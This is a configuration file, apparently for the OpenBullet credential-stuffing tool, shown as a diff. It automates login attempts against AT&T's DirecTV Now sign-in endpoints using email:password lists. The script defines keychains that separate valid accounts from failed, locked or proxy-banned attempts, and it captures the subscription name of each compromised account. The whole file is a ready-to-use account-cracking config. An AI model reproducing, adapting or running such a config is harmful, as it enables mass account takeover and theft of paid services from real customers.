@@ -1,0 +1,101 @@
+[SETTINGS]
+{
+  "Name": "DirectTVNow",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-15T19:46:29.5076192+02:00",
+  "AdditionalInfo": "",
+  "Author": "HorusGod",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST GET "https://www.directvnow.com/accounts/sign-in" 
+  
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: http://www.directvnow.com/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+
+REQUEST POST "https://cprodmasx.att.com/commonLogin/igate_wam/multiLogin.do" 
+  CONTENT "userid=<USER>&password=<PASS>&cancelURL=https%3A%2F%2Fcprodmasx.att.com%2FcommonLogin%2Figate_wam%2Fcontroller.do%3FTAM_OP%3Dlogin%26USERNAME%3Dunauthenticated%26ERROR_CODE%3D0x00000000%26ERROR_TEXT%3DHPDBA0521I%2520%2520%2520Successful%2520completion%26METHOD%3DGET%26URL%3D%252Fpkmsvouchfor%253FATT%2526https%253A%252F%252Fcprodx.att.com%252FTokenService%252FnxsATS%252FWATokenService%253FisPassive%253Dfalse%2526appID%253Dm14961%2526lang%253Den%2526returnURL%253Dhttps%25253A%25252F%25252Fapi.cld.dtvce.com%25252Faccount%25252Faeg%25252Fums%25252Ftglogin%25253FnextUrl%25253Dhttps%2525253A%2525252F%2525252Fwww.directvnow.com%2525252Faccounts%2525252Fsign-in%26REFERER%3Dhttps%253A%252F%252Fcprodmasx.att.com%252FcommonLogin%252Figate_wam%252Fcontroller.do%253FTAM_OP%253Dlogout%2526USERNAME%253D%2526ERROR_CODE%253D0x00000000%2526ERROR_TEXT%253DSuccessful%252520completion%2526METHOD%253DGET%2526URL%253D%252Fpkmslogout%2526REFERER%253D%2526AUTHNLEVEL%253D%2526FAILREASON%253D%2526OLDSESSION%253D%2526style%253DTokenService%2526returnurl%253Dhttps%25253A%25252F%25252Fcprodx.att.com%25252FTokenService%25252FnxsATS%25252FWATokenService%25253FisPassive%25253Dfalse%252526appID%25253Dm14961%252526lang%25253Den%252526returnURL%25253Dhttps%2525253A%2525252F%2525252Fapi.cld.dtvce.com%2525252Faccount%2525252Faeg%2525252Fums%2525252Ftglogin%2525253FnextUrl%2525253Dhttps%252525253A%252525252F%252525252Fwww.directvnow.com%252525252Faccounts%252525252Fsign-in%26HOSTNAME%3Dcprodmasx.att.com%26AUTHNLEVEL%3D%26FAILREASON%3D%26OLDSESSION%3D&remember_me=Y&source=null&loginURL=%2FWEB-INF%2Fpages%2FdirectvNow%2FdtvNowLoginWeb.jsp&targetURL=%2Fpkmsvouchfor%3FATT%26https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dfalse%26appID%3Dm14961%26lang%3Den%26returnURL%3Dhttps%253A%252F%252Fapi.cld.dtvce.com%252Faccount%252Faeg%252Fums%252Ftglogin%253FnextUrl%253Dhttps%25253A%25252F%25252Fwww.directvnow.com%25252Faccounts%25252Fsign-in&appID=m14961&HOSTNAME=cprodmasx.att.com&style=m14961" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://cprodmasx.att.com/commonLogin/igate_wam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2Fpkmsvouchfor%3FATT%26https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dfalse%26appID%3Dm14961%26lang%3Den%26returnURL%3Dhttps%253A%252F%252Fapi.cld.dtvce.com%252Faccount%252Faeg%252Fums%252Ftglogin%253FnextUrl%253Dhttps%25253A%25252F%25252Fwww.directvnow.com%25252Faccounts%25252Fsign-in&REFERER=https%3A%2F%2Fcprodmasx.att.com%2FcommonLogin%2Figate_wam%2Fcontroller.do%3FTAM_OP%3Dlogout%26USERNAME%3D%26ERROR_CODE%3D0x00000000%26ERROR_TEXT%3DSuccessful%2520completion%26METHOD%3DGET%26URL%3D%2Fpkmslogout%26REFERER%3D%26AUTHNLEVEL%3D%26FAILREASON%3D%26OLDSESSION%3D%26style%3DTokenService%26returnurl%3Dhttps%253A%252F%252Fcprodx.att.com%252FTokenService%252FnxsATS%252FWATokenService%253FisPassive%253Dfalse%2526appID%253Dm14961%2526lang%253Den%2526returnURL%253Dhttps%25253A%25252F%25252Fapi.cld.dtvce.com%25252Faccount%25252Faeg%25252Fums%25252Ftglogin%25253FnextUrl%25253Dhttps%2525253A%2525252F%2525252Fwww.directvnow.com%2525252Faccounts%2525252Fsign-in&HOSTNAME=cprodmasx.att.com&AUTHNLEVEL=&FAILREASON=&OLDSESSION=" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "That User ID and password combination doesn" 
+    KEY "We want to keep your information safe. We temporarily locked your account after too many unsuccessful sign-in attempts." 
+    KEY "ID not authorized" 
+    KEY "For your security, your AT&T Access ID has a temporary protection lock." 
+    KEY "Looks like you're trying to log in with your old DIRECTV ID. Since you've bundled your services, you'll want to use the AT&amp;T Access ID displayed below from now on. Enter your AT&amp;T Access ID password, and we'll finish logging you in." 
+    KEY "Just confirm your AT&T password below. Then, you'll use your AT&T ID and password whenever you sign in to DIRECTV NOW." 
+  KEYCHAIN Success OR 
+    KEY "<input type=\"hidden\" name=\"TATS-TokenID\" value=\"" 
+  KEYCHAIN Ban OR 
+    KEY "403 ERROR" 
+    KEY "Proxy Authorization Required" 
+    KEY "proxy node error" 
+    KEY "Please login to browse the internet" 
+    KEY "400 Bad Request" 
+    KEY "<RESPONSECODE>" Contains "403" 
+    KEY "<RESPONSECODE>" Contains "404" 
+    KEY "<RESPONSECODE>" Contains "407" 
+    KEY "<RESPONSECODE>" Contains "422" 
+
+PARSE "<SOURCE>" LR "\"TATS-TokenID\" value=\"" "\"" EncodeOutput=TRUE -> VAR "TATS" 
+
+REQUEST POST "https://api.cld.dtvce.com/account/aeg/ums/tglogin?nextUrl=https%3A%2F%2Fwww.directvnow.com%2Faccounts%2Fsign-in" 
+  CONTENT "TATS-TokenID=<TATS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Referer: https://cprodmasx.att.com/commonLogin/igate_wam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2Fpkmsvouchfor%3FATT%26https%3A%2F%2Fcprodx.att.com%2FTokenService%2FnxsATS%2FWATokenService%3FisPassive%3Dfalse%26appID%3Dm14961%26lang%3Den%26returnURL%3Dhttps%253A%252F%252Fapi.cld.dtvce.com%252Faccount%252Faeg%252Fums%252Ftglogin%253FnextUrl%253Dhttps%25253A%25252F%25252Fwww.directvnow.com%25252Faccounts%25252Fsign-in&REFERER=https%3A%2F%2Fcprodmasx.att.com%2FcommonLogin%2Figate_wam%2Fcontroller.do%3FTAM_OP%3Dlogout%26USERNAME%3D%26ERROR_CODE%3D0x00000000%26ERROR_TEXT%3DSuccessful%2520completion%26METHOD%3DGET%26URL%3D%2Fpkmslogout%26REFERER%3D%26AUTHNLEVEL%3D%26FAILREASON%3D%26OLDSESSION%3D%26style%3DTokenService%26returnurl%3Dhttps%253A%252F%252Fcprodx.att.com%252FTokenService%252FnxsATS%252FWATokenService%253FisPassive%253Dfalse%2526appID%253Dm14961%2526lang%253Den%2526returnURL%253Dhttps%25253A%25252F%25252Fapi.cld.dtvce.com%25252Faccount%25252Faeg%25252Fums%25252Ftglogin%25253FnextUrl%25253Dhttps%2525253A%2525252F%2525252Fwww.directvnow.com%2525252Faccounts%2525252Fsign-in&HOSTNAME=cprodmasx.att.com&AUTHNLEVEL=&FAILREASON=&OLDSESSION=" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "src: url('https://cdns.directv.com/content/dam/dtv/gmott/fonts" 
+
+PARSE "<ADDRESS(nonce)>" LR "nonce=" "" -> VAR "RELAY" 
+
+REQUEST POST "https://api.cld.dtvce.com/account/aeg/ums/getSessionForToken?apiKey=qwerty" 
+  CONTENT "{\"nonce\":\"<RELAY>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Referer: <ADDRESS>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"message\":\"Success\"" 
+
+#Capture PARSE "<SOURCE>" JSON "name" Recursive=TRUE CreateEmpty=FALSE -> CAP "SUB" 
+
